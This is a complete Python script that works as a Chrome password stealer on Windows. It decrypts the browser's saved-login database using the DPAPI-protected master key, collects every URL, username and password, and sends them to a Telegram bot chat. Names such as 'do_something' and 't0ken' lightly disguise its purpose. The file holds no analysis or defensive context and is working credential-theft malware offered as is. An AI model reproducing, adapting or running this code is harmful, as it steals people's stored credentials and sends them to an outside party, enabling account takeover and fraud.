from datetime import datetime
startTime = datetime.now()
import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from os import getlogin
import telebot
#import webbrowser

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)
    
def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)
    
def get_master_key(url):
    with open(url, "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key
   
    
def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    except Exception as e:        
        return "DecryptionError"
    

def do_something(state, login_data):

    master_key = get_master_key(state)
    shutil.copy2(login_data, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    result = ""
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins") 
        count=0
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            if  decrypted_password != "DecryptionError" and len(decrypted_password) > 0 and len(username) > 0 and len(url) > 0:
                result += "URL: " + url + "\nUser Name: " + username + "\nPassword: "  + str(decrypted_password) + "\n" + "*" * 10 + "\n"
                count += 1
        result +="List length : " +str(count) + "\n" 
        
    except Exception as e:
        result += "\n" + "Error with query :" + "\n" + str(e)
        pass
    cursor.close()
    conn.close()
    try:
        os.remove("Loginvault.db")#Removing temp db
    except Exception as e:
        pass
    return result

if __name__ == "__main__":
    #Variables
    name_0f_user = getlogin()
    localState = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State'
    g00gle = "C:\\Users\\" + name_0f_user + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\" + "Login Data"
    t0ken  = <authentication token>
    chat_id = <chat id>
    try:
        message = do_something(localState,g00gle) + "\n" + "\nExecution Time: " + str(datetime.now() - startTime )
    except Exception as e:
        message = "\nExecution Time: " + "\n" + "\n" + str(datetime.now() - startTime )
        pass

    try:
        b0t = telebot.TeleBot(t0ken)        
        b0t.send_message(chat_id, message)
    except Exception as e:
            print(e)
            print("\nCould not connect to telegram API")
            pass
    #webbrowser.open("https://www.google.com/")
    input("End of Program\nPress ENTER") 



